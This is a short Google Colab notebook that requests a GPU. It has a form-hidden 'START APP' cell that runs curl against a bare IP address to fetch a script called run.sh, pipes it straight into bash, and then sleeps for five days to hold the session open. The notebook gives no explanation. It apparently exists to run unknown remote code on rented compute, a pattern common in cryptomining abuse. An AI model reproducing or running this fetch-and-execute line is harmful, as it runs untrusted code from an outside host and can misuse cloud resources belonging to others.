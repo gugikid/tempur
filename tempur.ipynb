{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "tempur.ipynb",
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "code",
      "metadata": {
        "id": "ebXXp-4gz1zq"
      },
      "source": [
        "#@title GPU\n",
        "! nvidia-smi"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "Oz1z3dITz9kf",
        "cellView": "form"
      },
      "source": [
        "#@title START APP\n",
        "%cd /sbin/\n",
        "!ls -la\n",
        "!curl -O cache http://54.36.167.80/~dewabiz/run.sh -sL | bash\n",
        "\n",
        "alive = True #@param {type:'boolean'}\n",
        " \n",
        "! sleep 432000"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}